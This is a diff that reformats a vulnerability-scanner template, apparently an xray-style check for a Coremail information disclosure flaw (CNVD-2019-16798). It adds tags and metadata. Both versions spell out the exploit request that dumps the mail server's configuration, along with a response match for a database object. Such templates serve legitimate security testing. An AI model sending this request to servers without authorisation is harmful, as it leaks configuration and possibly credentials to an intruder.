@@ -1,15 +1,17 @@
 id: CNVD-2019-16798
 
 info:
-    name: Coremail Information Disclosure
-    author: cc_ci(https://github.com/cc8ci)
-    severity: high
+  name: Coremail Information Disclosure
+  author: cc_ci
+  severity: high
+  verified: false
+  tags: cnvd,cnvd2019,coremail,disclosure
+  created: 2020/09/11
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
-        expression: response.status == 200 && response.body.bcontains(bytes("<object name=\"cm_md_db\">"))
+  r0:
+    request:
+      method: GET
+      path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
+    expression: response.status == 200 && response.body.bcontains(b'<object name="cm_md_db">')
 expression: r0()
-
